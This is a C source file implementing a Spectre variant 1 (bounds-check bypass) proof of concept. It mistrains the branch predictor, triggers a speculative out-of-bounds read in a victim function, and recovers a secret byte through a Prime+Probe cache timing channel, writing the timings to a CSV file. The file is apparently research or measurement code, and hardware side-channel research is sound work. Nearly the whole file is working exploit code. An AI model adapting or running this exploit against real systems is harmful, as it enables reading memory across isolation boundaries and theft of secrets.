#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

//#define MSR_EN 0xC0010119

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */

#pragma optimize("gt",on)

#else
#include <x86intrin.h> /* for rdtscp and clflush */

#endif

#define N_TRIES 20
#define N_VICTIM 15
#define N_TRAINING 16

#define CACHELINE_SZ 64
#define CACHELINE_SZ_BITS 6
#define CACHESET_N 64
#define CACHESET_BITS 6
//#define SECRET_RSHIFT_SET_BITS (8-CACHESET_BITS)
//#define SECRET_LSHIFT_ADDR_BITS (CACHELINE_SZ_BITS-SECRET_RSHIFT_SET_BITS)
#define CACHEASSOC 8
#define WAY_SZ (CACHELINE_SZ*CACHESET_N)
#define CACHE_SZ (WAY_SZ*CACHEASSOC)

static inline void wrmsr(uint64_t msr, uint64_t value)
{
        uint32_t low = value & 0xFFFFFFFF;
        uint32_t high = value >> 32;
        __asm__ volatile (
                "wrmsr"
                :
                : "c"(msr), "a"(low), "d"(high)
        );
}

static inline uint64_t rdmsr(uint64_t msr)
{
        uint32_t low, high;
        __asm__ volatile (
                "rdmsr"
                : "=a"(low), "=d"(high)
                : "c"(msr)
        );
        return ((uint64_t)high << 32) | low;
}

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
/*
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1
  */
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[WAY_SZ] __attribute__ ((aligned(WAY_SZ)));
uint8_t array_pp[CACHE_SZ] __attribute__ ((aligned(WAY_SZ)));
//uint64_t reload_time[N_TRIES*256];
uint64_t reload_time[N_TRIES*CACHESET_N*CACHEASSOC];

//char * secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t secret[10];

uint8_t temp = 10; //Used so compiler won’t optimize out victim_function()

void victim_function(size_t x) {
  if (x < array1_size) {
    //temp &= array2[array1[x] << SECRET_LSHIFT_ADDR_BITS];
    temp &= array2[array1[x] << CACHELINE_SZ_BITS];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 30 /* assume cache hit if time <= threshold */

static __inline__ uint64_t gy_rdtscp(void)
{
  uint32_t lo, hi;
  //__asm__ __volatile__ (
  //asm volatile (
  //      "xorl %%eax,%%eax \n        cpuid"
  //      ::: "%rax", "%rbx", "%rcx", "%rdx");
  //__asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  return (uint64_t)hi << 32 | lo;
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2],
                    int score[2], int* results) {
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  uint64_t reload_time_temp[CACHEASSOC*CACHESET_N];
  uint8_t *preload_array2;

  for (i = 0; i < CACHESET_N; i++)
    results[i] = 0;


  for (tries = N_TRIES; tries > 0; tries--) {

    for (i = 0; i < CACHEASSOC; i++)
      for (j = 0; j < CACHESET_N; j++) {
	//for (volatile int z = 0; z < 100; z++) {}
        temp ^= array_pp[i*WAY_SZ + j*CACHELINE_SZ];
      }

    /* 30 loops: 5 training runs (x=training_x)
                 per attack run (x=malicious_x)*/
    training_x = tries % array1_size;

    // Load the secret into cache for fast access
    results[CACHESET_N] ^= secret[0];
    // printf("%c", secret[0]);

    for (j = N_VICTIM; j >= 0; j--) {
      _mm_clflush( & array1_size);
      // Delay (can also mfence)
      for (volatile int z = 0; z < 100; z++) {}

      // Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0
      // Avoid jumps in case those tip off the branch predictor
      // Set x=FFF.FF0000 if j%6==0, else x=0
      x = ((j % N_TRAINING) - 1) & ~0xFFFF;
      // Set x=-1 if j&6=0, else x=0
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));

      // Call the victim!
#ifdef MSR_EN
      wrmsr(MSR_EN, 1);
#endif
      victim_function(x);
#ifdef MSR_EN
      wrmsr(MSR_EN, 0);
#endif

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < CACHESET_N; i++) {
      for (j = 0; j < CACHEASSOC; j++) {
        addr = & array_pp[j * WAY_SZ + i*CACHELINE_SZ];
        time1 = __rdtscp( & junk); /* READ TIMER */
        junk = * addr; /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp( & junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME

        // timings of the same set are placed together
        reload_time_temp[i*CACHEASSOC+j]=time2;
      }
    }

    for (i = 0; i < CACHESET_N; i++) {
      for (j = 0; j < CACHEASSOC; j++) {
        if (reload_time_temp[i*CACHEASSOC+j] > CACHE_HIT_THRESHOLD &&
            i != array1[training_x])
          results[i]++; /* cache hit - add +1 to score for this value */
        reload_time[(N_TRIES-tries)*CACHESET_N*CACHEASSOC+
                i*CACHEASSOC+j]=reload_time_temp[i*CACHEASSOC+j];
      }
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < CACHESET_N; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
    printf("%d %d %d %d %d\n", tries, value[0], score[0], value[1], score[1]);
    //if (results[j] >= (2 * results[k] + 5) ||
    //   (results[j] == 4 && results[k] == 0))
    //  break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[CACHESET_N] ^= junk;
  //temp ^= junk; /* use junk so code above won’t get optimized out*/
}

int main(int argc,
  const char * * argv) {
#ifdef MSR_EN
  printf("MSR_EN defined: %x\n", MSR_EN);
  wrmsr(MSR_EN, 0);
#endif
  /* default for malicious_x */
  secret[0] = SECRET; 
  printf("secret: %d\n", secret[0]);
  size_t malicious_x = (size_t)(secret - array1);
  int i, j, k, score[2], len = 1;
  uint8_t value[2];
  static int results[CACHESET_N+1];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  char * fname;
  fname = (char *) malloc(100);
  //sprintf(fname, "%s%s%s", "pp", argv[1], "_result.csv");
  //FILE* resfile = fopen(fname, "w");
  sprintf(fname, "%s%s%s", "pp", argv[1], "_time.csv");
  FILE* timefile = fopen(fname, "w");

  //printf("Reading %d bytes:\n", len);
  printf("array2 addr: %p\n", array2);
  printf("array_pp addr: %p\n", array_pp);
  //printf("SECRET_RSHIFT_SET_BITS: %d\n", SECRET_RSHIFT_SET_BITS);
  //printf("SECRET_LSHIFT_ADDR_BITS: %d\n", SECRET_LSHIFT_ADDR_BITS);
  printf("CACHE_SZ: %d\n", CACHE_SZ);
  printf("WAY_SZ: %d\n", WAY_SZ);
  printf("secret[0]: %d\n", secret[0]);
  while (--len >= 0) {
    //printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score, results);

    //for (i = 0; i < CACHESET_N; i++)
    //  fprintf(resfile, "%d ", results[i]);
    for (i = 0; i < N_TRIES; i++) {
      for (j = 0; j < CACHESET_N; j++) {
        for (k = 0; k < CACHEASSOC; k++) {
          fprintf(timefile, "%" PRIu64 " ",
            reload_time[i*CACHESET_N*CACHEASSOC+j*CACHEASSOC+k]);
        }
      }
      fprintf(timefile, "\n");
    }

    printf("%s: ", (score[0] > 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }

  printf("temp: %d\n", temp);

  //fclose(resfile);
  fclose(timefile);

  return (0);
}

